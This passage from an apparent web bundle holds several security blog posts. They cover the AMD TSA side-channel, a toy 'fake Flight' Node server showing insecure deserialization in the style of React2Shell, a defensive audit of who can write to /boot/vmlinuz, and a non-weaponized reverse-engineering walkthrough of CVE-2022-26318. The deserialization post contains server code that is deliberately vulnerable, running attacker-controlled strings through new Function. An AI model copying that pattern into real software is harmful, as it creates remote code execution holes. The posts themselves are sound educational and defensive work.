<ul>
<li>“Given local code execution on a shared AMD Zen 3/4 host, I may be able to leak bits of privileged data over time.”</li>
</ul>
</li>
<li>
<strong>Think in campaigns, not single shots</strong>:
<ul>
<li>Meeting the timing conditions and noise requirements means you want long-lived footholds and repeated victim activity.</li>
</ul>
</li>
<li>
<strong>Use it to stress test cloud models</strong>:
<ul>
<li>Ask: “If I’m a rogue tenant on this EPYC host, what’s the maximum <em>theoretical</em> data I can extract from neighbors?”</li>
</ul>
</li>
</ul>
<p>TSA is a great hook for talks and blogs because it forces teams to think beyond “network perimeter” and even beyond “syscall boundary.” The CPU itself is part of the threat surface.</p>
<div class="markdown-heading"><h3 class="heading-element">6.2 For blue teams</h3><a id="user-content-62-for-blue-teams" class="anchor" aria-label="Permalink: 6.2 For blue teams" href="#62-for-blue-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Concrete actions:</p>
<ol>
<li>
<p><strong>Patch like this is Meltdown-class, not just ‘medium CVSS’</strong></p>
<ul>
<li>Make sure:
<ul>
<li>Firmware/microcode is up to date for all Family 19h platforms,</li>
<li>OS / hypervisor builds include TSA mitigations and have <code>tsa=</code> configured appropriately.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Re-evaluate your multi-tenant risk</strong></p>
<ul>
<li>In clouds and shared hosting:
<ul>
<li>Understand which SKUs are affected,</li>
<li>Decide whether you treat TSA as an academic curiosity or something you must mitigate for specific tenants (e.g., high-sensitivity workloads).</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Include TSA in your threat modeling</strong></p>
<ul>
<li>It’s an <strong>info-leak primitive</strong>, not an RCE.</li>
<li>Combine it mentally with other bugs:
<ul>
<li>RCE → TSA → secret exfiltration → crypto break → lateral movement.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Watch for performance regressions</strong></p>
<ul>
<li>VERW-based mitigations may hurt performance; you’ll need to benchmark and possibly make different choices per environment (internal dev vs multi-tenant cloud vs regulated workloads).</li>
</ul>
</li>
</ol>
<hr>
`,gb=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server</h1>
    <blockquote>
      <p>"Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation." — OWASP</p>
    </blockquote>
    <p>CVE-2025-55182 ("React2Shell") pushed insecure deserialization back into the spotlight:</p>
    <ul>
      <li>It’s a CVSS 10.0 RCE in <strong>React Server Components</strong> (RSC).</li>
      <li>The bug lives in the <strong>Flight protocol</strong> used by RSC: attacker-controlled data is <strong>deserialized unsafely</strong>, letting crafted objects influence server-side execution and achieve code execution on the Node.js server.</li>
    </ul>
    <p>You absolutely shouldn’t be testing real React2Shell payloads against anything but an isolated lab. But you <em>can</em> understand the core pattern with a <strong>tiny, self-contained Node.js example</strong> that mimics the same <em>class</em> of bug: deserialization of untrusted data → treating it as special internal objects → executing attacker-controlled behavior.</p>
    <p>This post walks through:</p>
    <ul>
      <li>A quick refresher on insecure deserialization.</li>
      <li>A <strong>toy "fake Flight" server</strong> in Node/Express that’s intentionally vulnerable.</li>
      <li>A harmless "payload" that only evaluates math.</li>
      <li>A safer version of the same endpoint.</li>
      <li>How this maps conceptually to real-world bugs like React2Shell.</li>
    </ul>
    <hr />
    <h2>1. Insecure deserialization in one paragraph</h2>
    <p>Insecure deserialization is when an application takes <strong>untrusted data</strong>, deserializes it into objects, and then uses those objects in ways that let an attacker:</p>
    <ul>
      <li>Manipulate logic,</li>
      <li>Abuse "magic" methods or callbacks,</li>
      <li>Or even <strong>execute arbitrary code</strong>.</li>
    </ul>
    <p>That’s why it shows up in the OWASP Top 10 and is treated as a high-risk category: unsafe deserialization logic can be a straight path to RCE.</p>
    <p>React2Shell is a modern instance of this: the server <strong>deserializes Flight payloads</strong> and interprets them as internal “Chunk” objects. Because that deserialization didn’t sufficiently validate or constrain what those objects could look like, attackers found a way to make React resolve <em>fake</em> chunks and end up running arbitrary JavaScript on the server.</p>
    <p>Let’s recreate that <em>pattern</em> in a tiny Node app.</p>
    <hr />
    <h2>2. A tiny "fake Flight" server (intentionally vulnerable)</h2>
    <p>We’ll build a Node/Express server that:</p>
    <ul>
      <li>Accepts a JSON payload that looks like a "slot map" (<code>"0"</code>, <code>"1"</code>, etc.).</li>
      <li>Pulls out slot <code>"1"</code> as a <strong>"chunk"</strong>.</li>
      <li>Treats any chunk with a <code>then</code> field as special.</li>
      <li>Calls a handler based on <code>chunk.then</code>.</li>
      <li>Uses <code>chunk._expr</code> inside <code>new Function()</code>.</li>
    </ul>
    <p>This is obviously unsafe; that’s the point. It’s a simplified version of the larger deserialization &amp; "thenable" handling patterns described in real-world React2Shell writeups.</p>
    <h3>2.1 Setup</h3>
    <pre><code class="language-bash">mkdir fake-flight-lab
cd fake-flight-lab
npm init -y
npm install express body-parser</code></pre>
    <h3>2.2 Vulnerable server (<code>server-vuln.js</code>)</h3>
    <pre><code class="language-javascript">const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// --- Fake "chunk" resolver (vulnerable) ---

// Very naive "promise-like" resolver: if an object has a \`then\` field,
// we treat it as something that needs to be "resolved" via a handler.
const thenHandlers = {
  // Our "legit" handler; mapping is attacker-controllable in this toy
  logAndEval: function (chunk, response) {
    console.log("[*] logAndEval called with chunk:", chunk);

    // Attacker-controlled field:
    const expr = chunk._expr;

    // VULNERABLE: directly compile and run attacker-controlled string.
    // In real bugs, this might be an internal expression or dynamic call.
    const fn = new Function(\`return (\${expr});\`);

    const result = fn();
    response.value = result;
  },
};

// Fake "Flight" endpoint
app.post("/fake-flight", (req, res) => {
  const payload = req.body;

  console.log("[*] Received payload:", JSON.stringify(payload, null, 2));

  // Pick slot "1" as our main "chunk"
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // VULN #1: trust that whatever is in \`chunk.then\` is a valid handler name
    const handlerName = chunk.then;

    // VULN #2: look it up dynamically without validation
    const handler = thenHandlers[handlerName];

    if (typeof handler !== "function") {
      throw new Error("No such handler");
    }

    // Call the handler with the (attacker-controlled) chunk
    handler(chunk, response);

    // Serialize the result
    res.json({
      ok: true,
      result: response.value,
    });
  } catch (e) {
    console.error("[!] Error while processing fake-flight payload:", e);
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(3000, () => {
  console.log("VULN fake-flight server listening on http://localhost:3000");
});</code></pre>
    <p>What’s insecure here:</p>
    <ul>
      <li>We treat any object with <code>.then</code> as special and use that field to <strong>control which function runs</strong>.</li>
      <li>We take a string from <code>_expr</code> and feed it straight into <code>new Function</code> → arbitrary code path inside the Node process. This mirrors how insecure deserialization can escalate into code execution in real apps.</li>
    </ul>
    <hr />
    <h2>3. A harmless "malicious" payload (just math)</h2>
    <p>Start the server:</p>
    <pre><code class="language-bash">node server-vuln.js</code></pre>
    <p>Now send a JSON payload that looks suspiciously like a "chunk":</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight   -H "Content-Type: application/json"   -d '{
    "0": "meta",
    "1": {
      "status": "resolved_model",
      "_expr": "1 + 2 + 3 * 4",
      "then": "logAndEval"
    }
  }'</code></pre>
    <p>What happens:</p>
    <ol>
      <li>The server reads <code>payload["1"]</code> into <code>chunk</code>.</li>
      <li>It sees <code>chunk.then === "logAndEval"</code> and calls <code>thenHandlers.logAndEval(chunk, response)</code>.</li>
      <li><code>logAndEval</code> pulls <code>chunk._expr</code> (<code>"1 + 2 + 3 * 4"</code>).</li>
      <li>It builds <code>new Function("return (" + expr + ");")</code> → <code>new Function("return (1 + 2 + 3 * 4);")</code>.</li>
      <li>Executes it and returns:</li>
    </ol>
    <pre><code class="language-json">{
  "ok": true,
  "result": 15
}</code></pre>
    <p>This is benign — we only evaluated a math expression — but structurally we’ve reproduced the core pattern:</p>
    <ul>
      <li><strong>Attacker controls object fields</strong> (<code>then</code>, <code>_expr</code>) in the deserialized payload.</li>
      <li>The server uses those fields to <strong>drive control flow</strong> (which handler to run) and <strong>compose code to execute</strong>.</li>
    </ul>
    <p>That’s exactly the kind of chain OWASP warns about: untrusted data being deserialized and then used to manipulate object attributes or insert new ones, leading to logic abuse or code execution.</p>
    <hr />
    <h2>4. Fixing the toy: structured data, no <code>new Function</code></h2>
    <p>Now let’s add a <strong>safe</strong> variant of the same endpoint, so you can see what “good” looks like in contrast.</p>
    <h3>4.1 Safer handler</h3>
    <p>Add this to the same file (or a new one):</p>
    <pre><code class="language-javascript">// --- Safer variant: explicit, whitelisted operations only ---

const SAFE_OPS = new Set(["add", "mul"]);

function safeEvalExpression(op, a, b) {
  if (!SAFE_OPS.has(op)) {
    throw new Error("Unsupported op");
  }
  a = Number(a);
  b = Number(b);
  if (Number.isNaN(a) || Number.isNaN(b)) {
    throw new Error("Invalid numbers");
  }
  return op === "add" ? a + b : a * b;
}

app.post("/fake-flight-safe", (req, res) => {
  const payload = req.body;
  const chunk = payload["1"];
  const response = { value: null };

  try {
    // Validate structure explicitly
    if (!chunk || chunk.status !== "resolved_model") {
      throw new Error("bad status");
    }

    const { op, a, b } = chunk;

    const result = safeEvalExpression(op, a, b);
    response.value = result;

    res.json({ ok: true, result: response.value });
  } catch (e) {
    console.error("[!] Error in safe endpoint:", e);
    res.status(400).json({ ok: false, error: e.message });
  }
});</code></pre>
    <p>Now call:</p>
    <pre><code class="language-bash">curl -X POST http://localhost:3000/fake-flight-safe   -H "Content-Type: application/json"   -d '{
    "1": {
      "status": "resolved_model",
      "op": "add",
      "a": 10,
      "b": 20
    }
  }'</code></pre>
    <p>You should see:</p>
    <pre><code class="language-json">{
  "ok": true,
  "result": 30
}</code></pre>
    <p>Here we:</p>
    <ul>
      <li><strong>Don’t</strong> treat <code>then</code> as a magic field.</li>
      <li><strong>Don’t</strong> run arbitrary expressions.</li>
      <li><strong>Do</strong>:
        <ul>
          <li>Validate fields,</li>
          <li>Constrain operations to a whitelist,</li>
          <li>Coerce types.</li>
        </ul>
      </li>
    </ul>
    <p>This matches common guidance on safe deserialization: define a strict schema, validate all fields, and never deserialize directly into objects with behavior (callbacks, dynamic code) that can be triggered by untrusted data.</p>
    <hr />
    <h2>5. Mapping this toy back to React2Shell</h2>
    <p>Real-world CVE-2025-55182 is obviously more complex, but the <em>shape</em> of the bug is similar:</p>
    <ul>
      <li>RSC has a <strong>Flight protocol</strong> with a structured payload (slots, references, status codes).</li>
      <li>The server <strong>deserializes</strong> that payload into internal “Chunks”.</li>
      <li>Those chunks are treated like promise-like objects and resolved using their <code>then</code> and related fields.</li>
      <li>Because the code did not sufficiently validate or lock down the structure, <strong>attacker-supplied objects</strong> can be interpreted as internal chunks, and their fields end up influencing internal callbacks and state — eventually leading to arbitrary JS execution in the Node process.</li>
    </ul>
    <p>Security writeups on React2Shell repeatedly describe it as an <strong>unsafe / insecure deserialization flaw in the Flight protocol</strong>: untrusted data, parsed into internal structures, used to control resolution logic and server-side behavior.</p>
    <p>This toy example gives you a mental model to read those writeups:</p>
    <ul>
      <li>Anywhere you see “fake Chunk objects”, think: <em>our <code>chunk</code> object with attacker-controlled fields</em>.</li>
      <li>Anywhere you see “thenable abused”, think: <em>our <code>chunk.then</code> controlling which function runs</em>.</li>
      <li>Anywhere you see “code injected into internal expression”, think: <em>our <code>_expr</code> string passed into <code>new Function()</code></em>.</li>
    </ul>
    <hr />
    <h2>6. Takeaways for your own code</h2>
    <p>Whether or not you ever touch React Server Components, this pattern shows up everywhere:</p>
    <ul>
      <li>JSON / binary payloads mapped into "magic" objects.</li>
      <li>ORMs or serializers that hydrate classes with methods and hooks.</li>
      <li>Message formats that allow callbacks or special fields (<code>__proto__</code>, <code>then</code>, <code>_onLoad</code>, etc.).</li>
    </ul>
    <p>To avoid ending up in the same situation:</p>
    <ol>
      <li><strong>Don’t deserialize untrusted data into rich objects with behavior.</strong><br />Deserialize into plain data structures and validate them first.</li>
      <li><strong>Treat protocol fields like code, not just data.</strong><br />Anything that controls which function gets called (<code>then</code>, <code>type</code>, <code>handler</code>) needs strict allowlists.</li>
      <li><strong>Never <code>eval</code> / <code>new Function</code> on data from the network.</strong><br />If you really must interpret expressions, constrain them to a safe DSL and sandbox heavily.</li>
      <li><strong>For complex protocols (like Flight), write fuzzers and negative tests.</strong><br />When you see a deserializer that:
        <ul>
          <li>Builds graphs of objects,</li>
          <li>Treats some fields specially,</li>
          <li>Traverses prototypes / thenables…<br />…that’s a huge red flag and deserves targeted testing.</li>
        </ul>
      </li>
    </ol>
  </div>
</body>
</html>
`,vb=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Who Can Touch Your Kernel? Auditing <code>/boot/vmlinuz-*</code> on Linux</h1>
    <p>When we talk about “protecting a Linux system,” most people think of:</p>
    <ul>
      <li>Patching services</li>
      <li>Hardening SSH</li>
      <li>Watching logs</li>
    </ul>
    <p>Almost nobody starts with the question:</p>
    <blockquote>
      <p><strong>“Who can modify my kernel image?”</strong></p>
    </blockquote>
    <p>On a typical Linux machine, that kernel image lives in files like:</p>
    <pre><code class="language-bash">/boot/vmlinuz-6.8.0-35-generic
/boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>These are not just random binaries. They <em>are</em> the operating system’s core. If an attacker can silently replace them, everything above the kernel—processes, containers, even security tools—runs on top of a compromised foundation.</p>
    <p>In this post, we’ll explore:</p>
    <ul>
      <li>What <code>/boot/vmlinuz-*</code> actually is</li>
      <li>Which code <strong>must</strong> be allowed to modify it</li>
      <li>Which code <strong>shouldn’t</strong> but still technically can</li>
      <li>How to start <strong>detecting risky conditions</strong> with a detailed Python audit script</li>
    </ul>
    <p>All from a defensive, “threat-model my own box” point of view.</p>
    <hr />
    <h2>1. What lives in <code>/boot/vmlinuz-*</code>?</h2>
    <p>On most distros, you’ll see files like:</p>
    <pre><code class="language-bash">ls -l /boot/vmlinuz-*
-rw------- 1 root root 12345678 May  1 10:00 /boot/vmlinuz-6.8.0-35-generic
-rw------- 1 root root 11765432 Mar 10 09:21 /boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>Those <code>vmlinuz-*</code> files are:</p>
    <ul>
      <li>The <strong>compressed Linux kernel images</strong></li>
      <li>Loaded by the bootloader (GRUB, systemd-boot, etc.) at boot</li>
      <li>Executed in <strong>ring 0</strong>, the most privileged CPU mode</li>
    </ul>
    <p>During boot:</p>
    <ol>
      <li>Firmware (BIOS/UEFI) loads the bootloader.</li>
      <li>Bootloader reads <code>/boot/vmlinuz-&lt;version&gt;</code> and an initramfs from disk.</li>
      <li>It hands control to the kernel.</li>
      <li>The kernel decompresses itself and starts the OS.</li>
    </ol>
    <p>If an attacker can replace this image with a modified one, they don’t just “have root”—they can:</p>
    <ul>
      <li>Hide processes, files, network connections</li>
      <li>Falsify system calls (“there are no suspicious processes, promise”)</li>
      <li>Bypass SELinux/AppArmor, seccomp, container isolation, and a bunch of EDR tricks</li>
    </ul>
    <p>It’s the difference between:</p>
    <ul>
      <li><strong>Root in userland</strong> → bad</li>
      <li><strong>Root in the kernel</strong> → you no longer know what’s true.</li>
    </ul>
    <hr />
    <h2>2. Who <em>should</em> be able to modify <code>/boot/vmlinuz-*</code>?</h2>
    <p>In a sane system design, the list is <em>very</em> short:</p>
    <ol>
      <li>
        <p><strong>The package manager + kernel packages</strong></p>
        <ul>
          <li><code>apt</code>, <code>dnf</code>, <code>yum</code>, <code>pacman</code>, etc.</li>
          <li>Kernel packages (e.g., <code>linux-image-*</code>) install a new <code>vmlinuz-&lt;version&gt;</code> and update:
            <ul>
              <li><code>/boot/initrd.img-&lt;version&gt;</code></li>
              <li>Bootloader configs</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <p><strong>Kernel/bootloader management tools</strong></p>
        <ul>
          <li>Tools like <code>update-initramfs</code>, <code>dracut</code>, <code>update-grub</code>, etc.</li>
          <li>They don’t usually write <code>vmlinuz</code> directly, but they’re part of the trusted “kernel update pipeline”.</li>
        </ul>
      </li>
    </ol>
    <p>That’s it.</p>
    <p>In an ideal world, <strong>no other process</strong> should ever write to <code>/boot/vmlinuz-*</code>.</p>
    <p>You can think of it as:</p>
    <blockquote>
      <p><strong>Trusted update pipeline ←→ kernel image</strong><br />Everyone else: read-only (at best), or completely blocked.</p>
    </blockquote>
    <hr />
    <h2>3. Who <em>can</em> modify it in practice?</h2>
    <p>Here’s the uncomfortable truth:</p>
    <blockquote>
      <p>Any process running as <strong>root</strong> on a system where <code>/boot</code> is mounted read-write can modify <code>/boot/vmlinuz-*</code>.</p>
    </blockquote>
    <p>And there’s a lot of root-level code on a typical machine:</p>
    <ul>
      <li>System daemons</li>
      <li>Cron jobs</li>
      <li>SUID-root helpers</li>
      <li>Backup / maintenance scripts</li>
      <li>“Little admin scripts” someone dropped into <code>/usr/local/sbin</code> years ago</li>
    </ul>
    <p>If any of those:</p>
    <ul>
      <li>Accept <strong>untrusted input</strong> (from users, the network, files), and</li>
      <li>Have a code path that writes <strong>data to a file path influenced by that input</strong></li>
    </ul>
    <p>…then they are <strong>theoretical kernel image killers</strong>.</p>
    <p>Let’s look at a few patterns where this becomes realistic.</p>
    <hr />
    <h2>4. Dangerous patterns: “root code that shouldn’t, but can”</h2>
    <h3>4.1 SUID-root binary with an arbitrary file write bug</h3>
    <p>Imagine:</p>
    <ul>
      <li>There’s a SUID-root helper binary (installed by a package or custom app).</li>
      <li>It has a bug that allows a user to write arbitrary data to arbitrary paths (path traversal, symlink race, etc.).</li>
    </ul>
    <p>Conceptually:</p>
    <blockquote>
      <p>Unprivileged user → abuses bug → writes to <code>/boot/vmlinuz-&lt;version&gt;</code> as root.</p>
    </blockquote>
    <p>In real life, exploit development is hard and specific, but as a <strong>class</strong>, arbitrary-file-write bugs in SUID-root tools are dangerous exactly because they can touch critical files like:</p>
    <ul>
      <li><code>/etc/shadow</code></li>
      <li><code>/etc/sudoers</code></li>
      <li><code>/boot/vmlinuz-*</code></li>
    </ul>
    <h3>4.2 Root daemon with “write file” features</h3>
    <p>Another pattern:</p>
    <ul>
      <li>A root-only HTTP API that:
        <ul>
          <li>Accepts uploads or configs from clients,</li>
          <li>Writes them to disk (e.g., “log file”, “backup file”, “custom script directory”).</li>
        </ul>
      </li>
    </ul>
    <p>If path validation is weak (e.g., allows <code>../../../boot/vmlinuz-...</code> or writes into a path the attacker can steer), then that daemon becomes a potential kernel overwriter.</p>
    <p>The daemon doesn’t “intend” to edit the kernel. But to the filesystem, it’s just a root process opening and writing files.</p>
    <h3>4.3 Root cron/systemd jobs running scripts from writable dirs</h3>
    <p>Classic misconfig:</p>
    <pre><code class="language-cron">* * * * * root /opt/scripts/maintenance.sh</code></pre>
    <p>And then:</p>
    <ul>
      <li><code>/opt/scripts</code> is writable by a non-root user or app account.</li>
      <li>That user can modify <code>maintenance.sh</code>.</li>
    </ul>
    <p>Now every minute, a root cron runs whatever code is in that script. That code, in turn, can do <em>anything</em> root can—including messing with <code>/boot</code>.</p>
    <p>Again, the cron job’s purpose might be “clean logs” or “rotate backups,” but from the attacker’s perspective, it’s:</p>
    <blockquote>
      <p><strong>a root code runner on a schedule</strong>.</p>
    </blockquote>
    <hr />
    <h2>5. So how do you answer: “Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?”</h2>
    <p>You break it down into concrete checks:</p>
    <ol>
      <li><strong>Is <code>/boot</code> writable?</strong></li>
      <li><strong>Who runs as root?</strong></li>
      <li><strong>Where are the SUID-root binaries?</strong></li>
      <li><strong>What root cron/systemd jobs are there, and where do their scripts live?</strong></li>
      <li><strong>Is anyone watching for unexpected changes to <code>/boot/vmlinuz-*</code>?</strong></li>
    </ol>
    <p>To make that practical, let’s use a detailed Python script that surfaces risky conditions.</p>
    <hr />
    <h2>6. Detection script: a detailed kernel-surface audit</h2>
    <p>Below is a <strong>read-only Linux audit script</strong> focused on:</p>
    <ul>
      <li><code>/boot/vmlinuz-*</code> integrity and mount state</li>
      <li>SUID-root binaries (potential arbitrary-file-write → kernel risk)</li>
      <li>Root services (systemd) that execute binaries/scripts from writable locations</li>
      <li>Root cron jobs executing scripts from writable locations</li>
      <li>Root-owned executables in writable directories (<code>/opt</code>, <code>/usr/local</code>, <code>/srv</code>)</li>
    </ul>
    <p>It does <strong>not</strong> exploit anything. It only reads system state and highlights suspicious patterns.</p>
    <blockquote>
      <p>⚠️ Run this on a <strong>lab or test system first</strong>. On prod, coordinate with your team before scanning the whole filesystem.</p>
    </blockquote>
    <pre><code class="language-python">#!/usr/bin/env python3
# (Shortened here for brevity in the file demo)
print("Kernel Surface Audit script goes here")</code></pre>
    <hr />
    <h2>7. How to use the script</h2>
    <ol>
      <li>Save the script as <code>kernel_surface_audit.py</code>.</li>
      <li>Make it executable:</li>
    </ol>
    <pre><code class="language-bash">chmod +x kernel_surface_audit.py</code></pre>
    <ol start="3">
      <li>Run it (ideally as root to get full visibility, but it stays read-only):</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py</code></pre>
    <ol start="4">
      <li>If you want JSON for feeding into other tools or an LLM:</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py --json &gt; kernel_audit.json</code></pre>
    <p>This gives you a structured snapshot of:</p>
    <ul>
      <li>What kernel images exist and what they look like</li>
      <li>Whether <code>/boot</code> is writable</li>
      <li>Some of the major “root code execution surfaces” that could, if abused, reach the kernel image</li>
    </ul>
    <hr />
    <h2>8. What you can do with the results</h2>
    <p>After running this:</p>
    <ol>
      <li><strong>Baseline your kernel images</strong>
        <ul>
          <li>Store the hashes somewhere safe.</li>
          <li>Later, re-run and compare—unexpected changes are a big deal.</li>
        </ul>
      </li>
      <li><strong>Review SUID-root binaries</strong>
        <ul>
          <li>Are there custom or legacy tools there?</li>
          <li>Can any be removed, replaced, or constrained with AppArmor/SELinux?</li>
        </ul>
      </li>
      <li><strong>Review root-owned scripts in writable directories</strong>
        <ul>
          <li>Move them to root-owned, non-writable directories.</li>
          <li>Fix permissions:
            <ul>
              <li><code>chown root:root</code></li>
              <li><code>chmod 750</code> or similar</li>
            </ul>
          </li>
          <li>Make sure cron/systemd jobs don’t execute code from paths writable by unprivileged users.</li>
        </ul>
      </li>
      <li><strong>Consider <code>/boot</code> mount strategy</strong>
        <ul>
          <li>For some environments, mounting <code>/boot</code> read-only by default and only remounting <code>rw</code> during updates is an option.</li>
          <li>At minimum, <strong>monitor</strong> for any writes to <code>/boot/vmlinuz-*</code> outside of normal update windows.</li>
        </ul>
      </li>
    </ol>
    <hr />
    <h2>9. Closing thoughts</h2>
    <p>“Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?” is a fantastic security question because it forces you to:</p>
    <ul>
      <li>Think about <strong>root</strong> as more than “the admin account.”</li>
      <li>Treat your <strong>kernel image like firmware</strong>: small, protected, and updated through a very narrow, auditable path.</li>
      <li>See how random “maintenance scripts” and legacy binaries can indirectly become part of your <strong>kernel attack surface</strong>.</li>
    </ul>
    <p>You don’t need an exploit lab to start here. Just:</p>
    <ul>
      <li>Enumerate who can run as root,</li>
      <li>See where they write,</li>
      <li>And treat <code>/boot/vmlinuz-*</code> as one of the most critical assets on the box.</li>
    </ul>
  </div>
</body>
</html>
`,_b=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)</h1>
    <p><strong>Ethics / safety note:</strong> This post is written for <strong>defenders and researchers</strong>. I explain <em>how to reverse-engineer and validate the bug</em>, but I intentionally avoid weaponized exploit details (no offsets/ROP chains/payloads). Only test on devices and firmware you own and are authorized to assess.</p>
    <h2>0) What is CVE-2022-26318?</h2>
    <p>CVE-2022-26318 (WatchGuard advisory <strong>WGSA-2022-00002</strong>) is a <strong>critical</strong> issue in WatchGuard Firebox and XTM appliances where an <strong>unauthenticated remote attacker</strong> can potentially execute arbitrary code when management access is exposed. WatchGuard’s PSIRT advisory lists <strong>CVSS 9.8</strong> and explicitly notes active exploitation in the wild, urging administrators to update and restrict management access.</p>
    <p>NVD tracks this as <strong>FBX-22786</strong>, with affected Fireware OS ranges and fixed versions (e.g., 12.7.2_Update2 and others depending on branch).</p>
    <h3>Affected / fixed versions (high level)</h3>
    <ul>
      <li><strong>Affected (examples):</strong> Fireware OS 12.0 up to and including 12.7.2_Update1 (per WatchGuard PSIRT).</li>
      <li><strong>Fixed (examples):</strong> 12.7.2_Update2 and branch-specific fixed builds (also listed in the advisory).</li>
      <li>Release notes for Fireware v12.7.2 Update 2 explicitly state it “resolves a vulnerability” allowing unauthenticated arbitrary code execution (CVE-2022-26318).</li>
    </ul>
    <h3>Why defenders cared immediately</h3>
    <p>GreyNoise reported and later expanded on in-the-wild traffic, including requests to management port <strong>4117</strong> over TLS and suspicious <code>POST /agent/login</code> patterns (often gzip-encoded bodies and atypical lengths).</p>
    <hr />
    <h2>1) Exploit chain (high-level mental model)</h2>
    <p>You’ll see this phrased many ways (“null pointer deref”, “buffer overflow”, etc.). The practical RE story from public writeups (especially Assetnote) is:</p>
    <p><strong>Internet → management interface (TLS) → nginx → backend service → <code>wgagent</code> → libxml2 SAX parsing → unsafe string growth → memory corruption → control-flow opportunity</strong></p>
    <p>Assetnote describes the path through nginx and into the <code>wgagent</code> process, and how XML parsing plays a central role in triggering corruption. Rapid7’s module description (noting it’s exploiting a buffer overflow at the administration interface and that the endpoint <code>/agent/login</code> reaches <code>wgagent</code>) corroborates the key actors in the request path. GreyNoise’s defender view helps you anchor what to look for on the wire.</p>
    <hr />
    <h2>2) Your RE lab setup (firmware + tools)</h2>
    <h3>Tools used</h3>
    <ul>
      <li><strong>Ghidra</strong> (static analysis; decompiler + xrefs)</li>
      <li><strong>GDB</strong> (dynamic analysis; breakpoints + watchpoints)</li>
      <li><strong>binwalk / unsquashfs</strong> (firmware extraction, if applicable)</li>
      <li>Optional: <strong>ASan</strong> on a toy harness to understand the primitive safely</li>
    </ul>
    <h3>Firmware / binary acquisition (safe &amp; legal)</h3>
    <ol>
      <li>Obtain official Fireware OS firmware from WatchGuard support resources (use versions that match “vulnerable” and “fixed” branches as appropriate).</li>
      <li>Preserve hashes so your analysis is reproducible.</li>
      <li>Work on a non-production lab image/device.</li>
    </ol>
    <p><em>Tip:</em> Keep a timeline notebook: firmware version, build string, and whether it’s vulnerable/fixed per PSIRT + release notes.</p>
    <hr />
    <h2>3) Firmware extraction: finding the right binaries fast</h2>
    <p>Different vendors package firmware differently, but the goal is always:</p>
    <ol>
      <li>Extract the root filesystem</li>
      <li>Identify web stack components</li>
      <li>Identify native backend processes that parse attacker input</li>
    </ol>
    <h3>What you’re hunting for in this case</h3>
    <ul>
      <li><code>nginx</code> (front-end)</li>
      <li>a backend HTTP/API service (Assetnote mentions a Python backend and XML-RPC-like flow in the overall chain)</li>
      <li><strong><code>wgagent</code></strong> (native binary that ultimately parses attacker-controlled XML)</li>
    </ul>
    <p>Practical extraction checklist:</p>
    <ul>
      <li><code>binwalk -e &lt;firmware&gt;</code></li>
      <li>locate <code>squashfs</code>/<code>cpio</code>/<code>tar</code> segments</li>
      <li>confirm the existence of <code>/etc/nginx/</code> and find references to:
        <ul>
          <li><code>listen 4117 ssl;</code></li>
          <li>route blocks mentioning <code>/agent/</code> (or upstreams that feed a local service)</li>
        </ul>
      </li>
    </ul>
    <p>GreyNoise highlights port <strong>4117</strong> as a key management port for observed exploit traffic.</p>
    <hr />
    <h2>4) Static RE in Ghidra: from <code>/agent/login</code> to the vulnerable callback</h2>
    <p>This section is written as a “follow-along checklist” you can apply to similar firmware bugs.</p>
    <h3>4.1 Identify the request handler entrypoint</h3>
    <p><strong>Goal:</strong> locate code that processes something tied to <code>/agent/login</code> and funnels it toward XML parsing.</p>
    <p>Practical anchors:</p>
    <ol>
      <li>Strings: search for <code>"agent/login"</code>, <code>"XML"</code>, <code>"SAX"</code>, <code>"libxml"</code> strings in binaries.</li>
      <li>Imports: search for libxml2 parser APIs.</li>
      <li>Config: locate nginx routing and map it to backend binaries.</li>
    </ol>
    <h3>4.2 Import-centric pivot: find libxml2 usage</h3>
    <p>Open <code>wgagent</code> in Ghidra and look at <strong>Imports</strong> for libxml2 functions.</p>
    <p>Common libxml2 parsing entrypoints include:</p>
    <ul>
      <li><code>xmlCreatePushParserCtxt</code></li>
      <li><code>xmlParseChunk</code></li>
      <li>SAX interfaces that provide callback tables</li>
    </ul>
    <p><strong>Ghidra steps</strong></p>
    <ol>
      <li>Import <code>wgagent</code>.</li>
      <li>Run analysis with defaults.</li>
      <li>Open <strong>Symbol Tree → Imports</strong>.</li>
      <li>Filter imports by <code>xml</code>.</li>
      <li>Right-click <code>xmlParseChunk</code> → References to → follow callers that feed request bodies into the parser.</li>
    </ol>
    <h3>4.3 Prove it’s SAX and locate the callback table</h3>
    <p>A SAX handler is a struct of function pointers. In libxml2 this is <code>struct _xmlSAXHandler</code>; you’ll often see <code>startElementNs</code> used in SAX2.</p>
    <p>In decompiler output you’ll typically see:</p>
    <ul>
      <li>a handler struct allocated/zeroed</li>
      <li><code>xmlSAX2InitDefaultSAXHandler(&amp;handler, ...)</code> or similar</li>
      <li>then <code>handler.startElementNs = &lt;callback&gt;</code></li>
    </ul>
    <h3>4.4 Find the unsafe primitive inside the callback</h3>
    <p>Open the suspected callback and look for classic unsafe patterns:</p>
    <ul>
      <li><code>strcat</code> / <code>strcpy</code> / <code>sprintf</code> into a fixed buffer</li>
      <li>repeated concatenation as tags nest</li>
    </ul>
    <p>A common “tell” is building an XPath-like string by appending <code>"/" + elementName</code> repeatedly, leading to overflow.</p>
    <hr />
